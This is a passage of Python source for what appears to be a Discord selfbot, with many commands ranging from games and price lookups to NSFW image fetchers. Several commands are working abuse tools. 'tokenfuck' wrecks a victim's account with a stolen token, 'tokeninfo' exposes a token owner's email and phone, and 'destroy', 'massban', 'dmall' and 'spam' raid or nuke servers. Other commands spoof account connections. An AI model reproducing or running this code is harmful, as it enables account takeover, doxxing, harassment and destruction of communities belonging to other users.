    em.add_field(name="Registered", value=user.created_at.strftime(date_format))
    if len(user.roles) > 1:
        role_string = ' '.join([r.mention for r in user.roles][1:])
        em.add_field(name="Roles [{}]".format(len(user.roles)-1), value=role_string, inline=False)
    perm_string = ', '.join([str(p[0]).replace("_", " ").title() for p in user.guild_permissions if p[1]])
    em.add_field(name="Guild permissions", value=perm_string, inline=False)
    em.set_footer(text='ID: ' + str(user.id))
    return await ctx.send(embed=em)

@client.command()
async def minesweeper(ctx, size: int = 5): # b'\xfc'
    await ctx.message.delete()
    size = max(min(size, 8), 2)
    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]
    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size
    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]
    message = "**Click to play**:\n"
    for y in range(size):
        for x in range(size):
            tile = "||{}||".format(chr(11036))
            if has_bomb(x, y):
                tile = "||{}||".format(chr(128163))
            else:
                count = 0
                for xmod, ymod in m_offets:
                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):
                        count += 1
                if count != 0:
                    tile = "||{}||".format(m_numbers[count - 1])
            message += tile
        message += "\n"
    await ctx.send(message)

@client.command()
async def combine(ctx, name1, name2): # b'\xfc'
    await ctx.message.delete()
    name1letters = name1[:round(len(name1) / 2)]
    name2letters = name2[round(len(name2) / 2):]
    ship = "".join([name1letters, name2letters])
    emb = (discord.Embed(description=f"{ship}"))
    emb.set_author(name=f"{name1} + {name2}")
    await ctx.send(embed=emb)

@client.command(name='1337-speak', aliases=['1337speak'])
async def _1337_speak(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')

@client.command(aliases=['dvwl'])
async def devowel(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '')\
            .replace('E', '').replace('i', '').replace('I', '')\
            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)

@client.command()
async def blank(ctx): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
          try:
             await Alucard.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
          except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@client.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await Alucard.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@client.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url): # b'\xfc'
    await ctx.message.delete()
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await Alucard.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@client.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.Member = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

@client.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house): # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@client.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break

@client.command()
async def masslogin(ctx, choice = None): # b'\xfc'
    await ctx.message.delete()
    _masslogin(choice)

@client.command()
async def masscon(ctx, _type, amount: int, *, name=None): # b'\xfc'
    await ctx.message.delete()
    payload = {
        'name': name,
        'visibility': 1
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json',
    }
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        print(f'Avaliable connections: {avaliable}')
    for _i in range(amount):
        try:
            ID = random.randint(10000000, 90000000)
            time.sleep(5)
            r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
            if r.status_code == 200:
                print(f"[{Fore.GREEN}+{Fore.RESET}] New connection added!")
            else:
                print(f"[{Fore.RED}-{Fore.RESET}] Couldnt add connection!");break
        except (Exception, ValueError) as e:
            print(e);break
    print(f"[{Fore.GREEN}+{Fore.RESET}] Finished adding connections!")

@client.command(aliases=['fakeconnection', 'spoofconnection'])
async def fakenet(ctx, _type, *, name = None): # b'\xfc'
    await ctx.message.delete()
    ID  = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    payload = {
        'name': name,
        'visibility': 1
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json',
    }
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after = 3)
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
    if r.status_code == 200:
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after = 3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after = 3)

@client.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC')
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@client.command()
async def copy(ctx): # b'\xfc'
    await ctx.message.delete()
    await Alucard.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in Alucard.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@client.command()
async def destroy(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="https://alucard.wtf",
            reason="https://sAlucardesbot.github.io/selfbot/commands",
            icon=None,
            banner=None
        )
    except:
        pass
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

@client.command()
async def dmall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)
            await user.send(message)
        except:
            pass

@client.command()
async def massban(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass


@client.command()
async def test(ctx):
    await ctx.send('test')

@client.command()
async def masskick(ctx): # b'\xfc'
    await ctx.message.delete()
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass

@client.command()
async def massrole(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return

@client.command()
async def masschannel(ctx): # b'\xfc'
    await ctx.message.delete()
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=RandString())
        except:
            return

@client.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@client.command()
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@client.command()
async def massunban(ctx): # b'\xfc'
    await ctx.message.delete()
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@client.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()
    for _i in range(amount):
        await ctx.send(message)

@client.command()
async def dm(ctx, user : discord.Member, *, message): # b'\xfc'
    await ctx.message.delete()
    user = Alucard.get_user(user.id)
    if ctx.author.id == Alucard.user.id:
        return
    else:
        try:
            await user.send(message)
        except:
            pass

@client.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour): # b'\xfc'
    await ctx.message.delete()
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em)

@client.command()
async def tinyurl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@client.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role): # b'\xfc'
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break


@client.command()
async def restart(ctx):
    await client.close()


@client.command(name='8ball')
async def _8ball(ctx, *, question): # b'\xfc'
    responses = [
    'It is certain.',
    'Reply hazy, try again.',
    'Don’t count on it.',
    'It is decidedly so.',
    'Ask again later.',
    'My reply is no.',
    'Without a doubt.',
    'Better not tell you now.',
    'My sources say no.',
    'Yes – definitely.',
    'Cannot predict now.',
    'Outlook not so good.',
    'You may rely on it.',
    'Concentrate and ask again.',
    'Very doubtful.',
    'As I see it, yes.',
    'Most likely.',
    'Outlook good.',
    'Yes.',
    'Signs point to yes.'
    ]
    await ctx.send(f'Question: {question}\nAnswer: {random.choice(responses)}')

@client.command(aliases=['valorant'])
async def vagent(ctx):
    await ctx.message.delete()
    agents = [
'Jett Duelist South Korea',
'Raze Duelist Brazil',
'Breach Initiator Sweden',
'Omen Controller Unknown',
'Brimstone Controller United States',
'Phoenix Duelist United Kingdom',
'Sage Sentinel China',
'Sova Initiator Russia',
'Viper Controller United States',
'Cypher Sentinel Morocco',
'Reyna Duelist Mexico',
'Killjoy Sentinel Germany',
'Skye Initiator Australia',
'Yoru Duelist Japan',
'Astra Controller Ghana'
    ]
    answer = random.choice(agents)
    await ctx.send(answer)



@client.command()
async def virus(ctx):
        list = (
            f"``[▓▓▓                    ] / {virus}-virus.exe Packing files.``",
            f"``[▓▓▓▓▓▓▓                ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓           ] \ {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓         ] | {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓      ] / {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓   ] - {virus}-virus.exe Packing files..``",
            f"``[▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓ ] \ {virus}-virus.exe Packing files..``",
            f"``Successfully downloaded {virus}-virus.exe``",
            "``Injecting virus.   |``",
            "``Injecting virus..  /``",
            "``Injecting virus... -``",
            f"``Successfully Injected {virus}-virus.exe into discord go to https://127.0.0.1 for hacked discord access``",
        )
        for i in list:
            await asyncio.sleep(1.5)
            await ctx.message.edit(content=i)




@client.command()
async def reboot(ctx):
    embed = discord.Embed(
    title = " restarting!",
    author = ctx.message.author,

        colour = discord.Colour.red()
    )

    embed.set_author(name='Reboot!'),
    embed.add_field(name='Rebooting', value='I am rebooting!', inline=False),
    await ctx.send(embed=embed)

    await Alucard.close()

@client.command()
async def yuihug(ctx, user: discord.User = None):
    await ctx.message.delete()
    if isinstance(ctx.message.channel, discord.DMChannel) or isinstance(ctx.message.channel, discord.GroupChannel):
        await ctx.send("You can't use Yui Hug in DMs or GCs", delete_after=3)
    else:
        if user is None:
            await ctx.send("Please specify a user to Yui Hug", delete_after=3)
            return
        Alucard.yui_hug_user = user.id
        Alucard.yui_hug_channel = ctx.channel.id
        if Alucard.yui_hug_user is None or Alucard.yui_hug_channel is None:
            await ctx.send('An impossible error occured, try again later or contact swag')
            return
        while Alucard.yui_hug_user is not None and Alucard.yui_hug_channel is not None:
            await Alucard.get_channel(Alucard.yui_hug_channel).send('yui hug ' + str(Alucard.yui_hug_user), delete_after=0.1)
            await asyncio.sleep(60)

@client.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))

@client.command()
async def youtube(ctx, *, search):
    await ctx.message.delete()
    query_string = parse.urlencode({'search_query': search})
    html_content = request.urlopen('http://www.youtube.com/results?' + query_string)
    search_results = re.findall('href=\"\\/watch\\?v=(.{11})', html_content.read().decode())
    await ctx.send('https://www.youtube.com/watch?v=' + search_results[0])




@client.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.clientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@client.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    count = 0
    while True:
        try:
            count += 1
            channel = Alucard.get_channel(int(channelid))
            await channel.send('!d bump')
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@client.command()
async def tts(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@client.command()
async def upper(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)

@client.command(aliases=['guildpfp'])
async def guildicon(ctx): # b'\xfc'
    await ctx.message.delete()
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@client.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    for friend in Alucard.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)
       with open('Backup/Friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in Alucard.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f:
            f.write(blocklist+"\n" )

@client.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@client.command()
async def mac(ctx, mac): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('http://api.macvendors.com/' + mac)
    em = discord.Embed(title='MAC Lookup Result', description=r.text, colour=0xDEADBF)
    em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    await ctx.send(embed=em)

@client.command()
async def abc(ctx): # b'\xfc'
    await ctx.message.delete()
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@client.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@client.command(aliases=['Dogecoin'])
async def dgc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=DOGE&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Dogecoin', icon_url='https://upload.wikimedia.org/wikipedia/commons/d/d0/Dogecoin_Logo.png')
    await ctx.send(embed=em)

@client.command(aliases=['litecoin'])
async def ltc(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=LTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Dogecoin', icon_url='https://werkenvanuithetbuitenland.nl/wp-content/uploads/2021/01/litecoin-logo-.jpg')
    await ctx.send(embed=em)

@client.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)

@client.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f'{qa}\n{qor}\n{qb}')
    await ctx.send(embed=em)

@client.command()
async def hastebin(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@client.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@client.command()
async def anal(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def erofeet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def feet(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def lewdneko(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def lesbian(ctx): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)


@client.command()
async def feed(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def tickle(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def slap(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def hug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def smug(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def pat(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command()
async def kiss(ctx, user: discord.Member): # b'\xfc'
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@client.command(aliases=['proxy'])
async def proxies(ctx): # b'\xfc'
    await ctx.message.delete()
    file = open("Data/Http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")

@client.command()
async def uptime(ctx): # b'\xfc'
    await ctx.message.delete()
    uptime = datetime.datetime.utcnow() - start_time
    uptime = str(uptime).split('.')[0]
    await ctx.send(f'`'+uptime+'`')

@client.command()
async def purge(ctx, amount: int): # b'\xfc'
    await ctx.message.delete()
    async for message in ctx.message.channel.history(limit=amount).filter(lambda m: m.author == Alucard.user).map(lambda m: m):
        try:
           await message.delete()
        except:
            pass

@client.command(name='group-leaver', aliase=['leaveallgroups', 'leavegroup', 'leavegroups'])
